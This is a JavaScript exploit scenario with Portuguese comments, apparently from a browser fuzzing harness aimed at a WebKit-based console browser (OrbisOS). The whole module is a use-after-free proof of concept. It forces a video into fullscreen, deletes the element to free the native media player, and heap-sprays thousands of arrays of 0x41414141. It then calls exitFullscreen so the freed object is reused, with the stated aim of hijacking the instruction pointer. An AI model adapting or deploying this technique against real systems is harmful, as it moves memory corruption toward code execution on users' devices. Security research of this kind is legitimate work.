/**
 * CENÁRIO: VIDEO_FULLSCREEN_REMOVE (Main DOM + Manx Logic)
 * Alvo: FullscreenVideoController::exitFullscreen()
 */

export default {
    id:       'VIDEO_FULLSCREEN_REMOVE',
    category: 'Media',
    risk:     'CRITICAL',
    description: 'Volta ao setup principal do DOM para herdar o User-Gesture e permitir o Fullscreen automático, injetando o delay do Manx (500ms) e o Heap Spray para sequestro do PC/RIP.',

    setup: async function() {
        // Usamos o documento principal novamente para garantir o Fullscreen
        this.container = document.createElement('div');
        document.body.appendChild(this.container);
        
        this.video = document.createElement('video');
        this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
        
        // Mantemos os controles ativos caso você queira clicar fisicamente
        this.video.controls = true; 
        this.container.appendChild(this.video);

        // A munição de Spray: 0x41414141 (Endereço falso para forçar Crash CE-34878-0)
        this.sprayPayload = new Uint32Array(256);
        this.sprayPayload.fill(0x41414141);

        await new Promise(resolve => {
            const timeout = setTimeout(resolve, 400);
            this.video.addEventListener('loadedmetadata', () => {
                clearTimeout(timeout);
                resolve();
            }, { once: true });
        });
    },

    trigger: async function() {
        try {
            // 1. Entra em Fullscreen (O seu código original que funciona direto)
            if (this.video.webkitRequestFullscreen) {
                this.video.webkitRequestFullscreen();
            }

            // 2. O Segredo Manx: Esperamos 500ms para o OrbisOS alocar o player de hardware
            await new Promise(r => setTimeout(r, 500));

            // 3. FREE: Apagamos o vídeo do DOM. Isto destrói o MediaPlayerPrivate no C++
            this.video.remove();

            // 4. REUSE (SPRAY): Preenchemos o buraco na memória instantaneamente
            this.spray = [];
            for (let i = 0; i < 5000; i++) {
                let arr = new Uint32Array(256);
                arr.set(this.sprayPayload);
                this.spray.push(arr);
            }

            // 5. USE: O controlador tenta sair do Fullscreen lendo o player destruído.
            // Se o Spray funcionou, ele vai ler 0x41414141 e causar um Crash Controlado!
            if (document.webkitExitFullscreen) {
                document.webkitExitFullscreen();
            }

        } catch(e) {}
    },

    probe: [
        s => s.video.duration,
        s => s.video.readyState,
        s => s.video.videoWidth,
        s => s.video.webkitDecodedFrameCount,
        s => { try { return s.video.buffered.start(0); } catch(e) { return e.name; } }
    ],

    cleanup: function() {
        try { this.container.remove(); } catch(e) {}
        this.spray = null;
        this.video = null;
    }
};
